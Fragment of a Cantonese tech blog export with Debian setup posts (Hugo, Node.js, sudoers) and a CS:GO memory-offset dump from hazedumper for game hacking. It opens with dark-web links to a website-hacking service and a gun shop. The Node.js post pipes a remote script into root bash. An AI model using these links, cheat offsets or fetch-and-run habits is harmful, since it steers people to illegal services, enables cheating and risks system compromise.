<h1 id="Hacking"><a href="#Hacking" class="headerlink" title="Hacking"></a>Hacking</h1><p><a href="http://4jbc254b7izc5dtgpxxjoqmhtdsiugngzkjkfopbkfjlu4xqw6zed5qd.onion/">http://4jbc254b7izc5dtgpxxjoqmhtdsiugngzkjkfopbkfjlu4xqw6zed5qd.onion/</a></p>
<p><a href="http://3qpzilhobdujzsoyjxggbedxvgvg6tczdev2s4siqkoky764v6yg6vad.onion/service/websites-hacking.html">http://3qpzilhobdujzsoyjxggbedxvgvg6tczdev2s4siqkoky764v6yg6vad.onion/service/websites-hacking.html</a></p>
<p><a href="http://3qpzilhobdujzsoyjxggbedxvgvg6tczdev2s4siqkoky764v6yg6vad.onion/">http://3qpzilhobdujzsoyjxggbedxvgvg6tczdev2s4siqkoky764v6yg6vad.onion/</a></p>
<p><a href="http://kgvnqez7fozl7spb4rerrgtiai224hat244nqkvursjgimsh2bbggjyd.onion/">http://kgvnqez7fozl7spb4rerrgtiai224hat244nqkvursjgimsh2bbggjyd.onion/</a></p>
<p><a href="http://4hpfzoj3tgyp2w7sbe3gnmphqiqpxwwyijyvotamrvojl7pkra7z7byd.onion/2018/10/oh-my-god-they-killed-hpkp/">http://4hpfzoj3tgyp2w7sbe3gnmphqiqpxwwyijyvotamrvojl7pkra7z7byd.onion/2018/10/oh-my-god-they-killed-hpkp/</a></p>
<p><a href="http://ugdbp6mw657tljzmymg2u7xv3uhtmbcpgiiimtbsfqcv47kicisen7id.onion/">http://ugdbp6mw657tljzmymg2u7xv3uhtmbcpgiiimtbsfqcv47kicisen7id.onion/</a></p>
<h1 id="Guns"><a href="#Guns" class="headerlink" title="Guns"></a>Guns</h1><p><a href="http://2a2a2abbjsjcjwfuozip6idfxsxyowoi3ajqyehqzfqyxezhacur7oyd.onion/product-category/guns/page/3/">http://2a2a2abbjsjcjwfuozip6idfxsxyowoi3ajqyehqzfqyxezhacur7oyd.onion/product-category/guns/page/3/</a></p>
<h1 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h1><p><a href="http://shadowwsnbcuzdtx3v4ytjomxa5zt44lcwd5i7oq3r4d6cqvqvvhpgqd.onion/">http://shadowwsnbcuzdtx3v4ytjomxa5zt44lcwd5i7oq3r4d6cqvqvvhpgqd.onion/</a></p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>暗網</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian - 安裝 Hugo</title>
    <url>/2022/01/28/Debian-install-Hugo/</url>
    <content><![CDATA[<img src="/img/Post/image/Hugo/Hugo.svg" width="300px"/>

<h1 id="Hugo"><a href="#Hugo" class="headerlink" title="Hugo"></a>Hugo</h1><p>Hugo 是一個用 Go 編寫的靜態網站生成器，2013由 Steve Francia 原創。<br>自 v0.14 由 Bjørn Erik Pedersen 主力開發，並由全球各地的開發者和使用者提交貢獻。<br>Hugo 以 Apache License 2.0 授權的開放原始碼專案。</p>
<h2 id="APT-安裝"><a href="#APT-安裝" class="headerlink" title="APT 安裝"></a>APT 安裝</h2><p>只需要一句指令就可以安裝成功。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install hugo -y</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Hugo</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Debian 裝 nodejs 同 npm</title>
    <url>/2022/01/28/Debian-install-nodejs-and-npm/</url>
    <content><![CDATA[<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>今篇會係裝 Node.js v17.x ~</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update -y</span><br></pre></td></tr></table></figure>

<p>再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -</span><br></pre></td></tr></table></figure>

<p>再打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install nodejs npm -y</span><br></pre></td></tr></table></figure>

<p>完成。</p>
<p>Detail<br><a href="https://github.com/nodesource/distributions/blob/master/README.md#debinstall">https://github.com/nodesource/distributions/blob/master/README.md#debinstall</a></p>
]]></content>
      <categories>
        <category>Debian</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike: Global Offensive - Csgo Offsets</title>
    <url>/2022/01/29/Csgo-Offsets/</url>
    <content><![CDATA[<h1 id="Offsets"><a href="#Offsets" class="headerlink" title="Offsets"></a>Offsets</h1><figure class="highlight hpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2022-01-21 07:37:33.981800900 UTC</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> hazedumper &#123;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">int64_t</span> timestamp = <span class="number">1642750653</span>;</span><br><span class="line"><span class="keyword">namespace</span> netvars &#123;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> cs_gamerules_data = <span class="number">0x0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_ArmorValue = <span class="number">0x117CC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_Collision = <span class="number">0x320</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_CollisionGroup = <span class="number">0x474</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_Local = <span class="number">0x2FCC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_MoveType = <span class="number">0x25C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_OriginalOwnerXuidHigh = <span class="number">0x31D4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_OriginalOwnerXuidLow = <span class="number">0x31D0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_SurvivalGameRuleDecisionTypes = <span class="number">0x1328</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_SurvivalRules = <span class="number">0xD00</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_aimPunchAngle = <span class="number">0x303C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_aimPunchAngleVel = <span class="number">0x3048</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_angEyeAnglesX = <span class="number">0x117D0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_angEyeAnglesY = <span class="number">0x117D4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bBombDefused = <span class="number">0x29C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bBombPlanted = <span class="number">0x9A5</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bBombTicking = <span class="number">0x2990</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bFreezePeriod = <span class="number">0x20</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bGunGameImmunity = <span class="number">0x9990</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bHasDefuser = <span class="number">0x117DC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bHasHelmet = <span class="number">0x117C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bInReload = <span class="number">0x32B5</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bIsDefusing = <span class="number">0x997C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bIsQueuedMatchmaking = <span class="number">0x74</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bIsScoped = <span class="number">0x9974</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bIsValveDS = <span class="number">0x7C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bSpotted = <span class="number">0x93D</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bSpottedByMask = <span class="number">0x980</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bStartedArming = <span class="number">0x3400</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bUseCustomAutoExposureMax = <span class="number">0x9D9</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bUseCustomAutoExposureMin = <span class="number">0x9D8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bUseCustomBloomScale = <span class="number">0x9DA</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_clrRender = <span class="number">0x70</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_dwBoneMatrix = <span class="number">0x26A8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_fAccuracyPenalty = <span class="number">0x3340</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_fFlags = <span class="number">0x104</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flC4Blow = <span class="number">0x29A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flCustomAutoExposureMax = <span class="number">0x9E0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flCustomAutoExposureMin = <span class="number">0x9DC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flCustomBloomScale = <span class="number">0x9E4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flDefuseCountDown = <span class="number">0x29BC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flDefuseLength = <span class="number">0x29B8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flFallbackWear = <span class="number">0x31E0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flFlashDuration = <span class="number">0x10470</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flFlashMaxAlpha = <span class="number">0x1046C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flLastBoneSetupTime = <span class="number">0x2928</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flLowerBodyYawTarget = <span class="number">0x9ADC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flNextAttack = <span class="number">0x2D80</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flNextPrimaryAttack = <span class="number">0x3248</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flSimulationTime = <span class="number">0x268</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flTimerLength = <span class="number">0x29A4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_hActiveWeapon = <span class="number">0x2F08</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_hBombDefuser = <span class="number">0x29C4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_hMyWeapons = <span class="number">0x2E08</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_hObserverTarget = <span class="number">0x339C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_hOwner = <span class="number">0x29DC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_hOwnerEntity = <span class="number">0x14C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_hViewModel = <span class="number">0x3308</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iAccountID = <span class="number">0x2FD8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iClip1 = <span class="number">0x3274</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iCompetitiveRanking = <span class="number">0x1A84</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iCompetitiveWins = <span class="number">0x1B88</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iCrosshairId = <span class="number">0x11838</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iDefaultFOV = <span class="number">0x333C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iEntityQuality = <span class="number">0x2FBC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iFOV = <span class="number">0x31F4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iFOVStart = <span class="number">0x31F8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iGlowIndex = <span class="number">0x10488</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iHealth = <span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iItemDefinitionIndex = <span class="number">0x2FBA</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iItemIDHigh = <span class="number">0x2FD0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iMostRecentModelBoneCounter = <span class="number">0x2690</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iObserverMode = <span class="number">0x3388</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iShotsFired = <span class="number">0x103E0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iState = <span class="number">0x3268</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_iTeamNum = <span class="number">0xF4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_lifeState = <span class="number">0x25F</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_nBombSite = <span class="number">0x2994</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_nFallbackPaintKit = <span class="number">0x31D8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_nFallbackSeed = <span class="number">0x31DC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_nFallbackStatTrak = <span class="number">0x31E4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_nForceBone = <span class="number">0x268C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_nTickBase = <span class="number">0x3440</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_nViewModelIndex = <span class="number">0x29D0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_rgflCoordinateFrame = <span class="number">0x444</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_szCustomName = <span class="number">0x304C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_szLastPlaceName = <span class="number">0x35C4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_thirdPersonViewAngles = <span class="number">0x31E8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_vecOrigin = <span class="number">0x138</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_vecVelocity = <span class="number">0x114</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_vecViewOffset = <span class="number">0x108</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_viewPunchAngle = <span class="number">0x3030</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_zoomLevel = <span class="number">0x33E0</span>;</span><br><span class="line">&#125; <span class="comment">// namespace netvars</span></span><br><span class="line"><span class="keyword">namespace</span> signatures &#123;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> anim_overlays = <span class="number">0x2990</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> clientstate_choked_commands = <span class="number">0x4D30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> clientstate_delta_ticks = <span class="number">0x174</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> clientstate_last_outgoing_command = <span class="number">0x4D2C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> clientstate_net_channel = <span class="number">0x9C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> convar_name_hash_table = <span class="number">0x2F0F8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState = <span class="number">0x589FC4</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState_GetLocalPlayer = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState_IsHLTV = <span class="number">0x4D48</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState_Map = <span class="number">0x28C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState_MapDirectory = <span class="number">0x188</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState_MaxPlayer = <span class="number">0x388</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState_PlayerInfo = <span class="number">0x52C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState_State = <span class="number">0x108</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwClientState_ViewAngles = <span class="number">0x4D90</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwEntityList = <span class="number">0x4DD1E1C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwForceAttack = <span class="number">0x32022D0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwForceAttack2 = <span class="number">0x32022DC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwForceBackward = <span class="number">0x320230C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwForceForward = <span class="number">0x3202300</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwForceJump = <span class="number">0x527BC98</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwForceLeft = <span class="number">0x3202318</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwForceRight = <span class="number">0x3202324</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwGameDir = <span class="number">0x628700</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwGameRulesProxy = <span class="number">0x52EECFC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwGetAllClasses = <span class="number">0xDDFBFC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwGlobalVars = <span class="number">0x589CC8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwGlowObjectManager = <span class="number">0x531A118</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwInput = <span class="number">0x52233F0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwInterfaceLinkList = <span class="number">0x963264</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwLocalPlayer = <span class="number">0xDB65EC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwMouseEnable = <span class="number">0xDBC288</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwMouseEnablePtr = <span class="number">0xDBC258</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwPlayerResource = <span class="number">0x3200680</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwRadarBase = <span class="number">0x5206B94</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwSensitivity = <span class="number">0xDBC124</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwSensitivityPtr = <span class="number">0xDBC0F8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwSetClanTag = <span class="number">0x8A290</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwViewMatrix = <span class="number">0x4DC3734</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwWeaponTable = <span class="number">0x5223EB8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwWeaponTableIndex = <span class="number">0x326C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwYawPtr = <span class="number">0xDBBEE8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwZoomSensitivityRatioPtr = <span class="number">0xDC1D38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwbSendPackets = <span class="number">0xD93D2</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> dwppDirect3DDevice9 = <span class="number">0xA5050</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> find_hud_element = <span class="number">0x2CD64760</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> force_update_spectator_glow = <span class="number">0x3B88AA</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> interface_engine_cvar = <span class="number">0x3E9EC</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> is_c4_owner = <span class="number">0x3C5890</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_bDormant = <span class="number">0xED</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_flSpawnTime = <span class="number">0x103C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_pStudioHdr = <span class="number">0x2950</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_pitchClassPtr = <span class="number">0x5206E30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> m_yawClassPtr = <span class="number">0xDBBEE8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> model_ambient_min = <span class="number">0x58D03C</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> set_abs_angles = <span class="number">0x1E5010</span>;</span><br><span class="line"><span class="keyword">constexpr</span> ::std::<span class="keyword">ptrdiff_t</span> set_abs_origin = <span class="number">0x1E4E50</span>;</span><br><span class="line">&#125; <span class="comment">// namespace signatures</span></span><br><span class="line">&#125; <span class="comment">// namespace hazedumper</span></span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/frk1/hazedumper">https://github.com/frk1/hazedumper</a></p>
]]></content>
      <categories>
        <category>Counter-Strike Global Offensive</category>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Game Hacking</tag>
        <tag>dumper</tag>
      </tags>
  </entry>
  <entry>
    <title>Debain: user is not in the sudoers file. This incident will be reported</title>
    <url>/2022/01/28/Debian-user-is-not-in-the-sudoers-file-This-incident-will-be-reported/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Debian 本身既設定係唔俾你用 sudo 權限，<br>我地係需要入去改返，<br>呢篇文就係教你點改.</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>我地開你既 Terminal 然後登入 root user<br>又或者你 logout 而加個個入返去 root user.</p>
<p>normal user 就打呢句</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su -</span><br></pre></td></tr></table></figure>

<p>再打你既 root user 密碼</p>
<img src="/2022/01/28/Debian-user-is-not-in-the-sudoers-file-This-incident-will-be-reported/su%20-.gif" class="%">

<p>入左之後我地需要改一 <code>/etc/sudoers</code> files</p>
<p>我地打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nano /etc/sudoers</span><br></pre></td></tr></table></figure>

<p>入到去搵</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root    ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<img src="/2022/01/28/Debian-user-is-not-in-the-sudoers-file-This-incident-will-be-reported/two.png" class="">

<p>加一行叫做</p>
<p>例如你而加既 <code>Username</code> 係叫 <code>Halohalo</code><br>咁就打</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Halohalo    ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

<img src="/2022/01/28/Debian-user-is-not-in-the-sudoers-file-This-incident-will-be-reported/three.png" class="">

<p>然後就撳 <code>Ctrl + S</code> Save<br>再撳 <code>Ctrl + X</code> Exit</p>
<p>然後我地再打 <code>exit</code> logout 而加用緊既 root user Terminal</p>
<img src="/2022/01/28/Debian-user-is-not-in-the-sudoers-file-This-incident-will-be-reported/exit.png" class="">

<p>我地再試下用唔用到 sudo (隨便打個 command 試下用唔用到 root)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt update -y </span><br></pre></td></tr></table></figure>

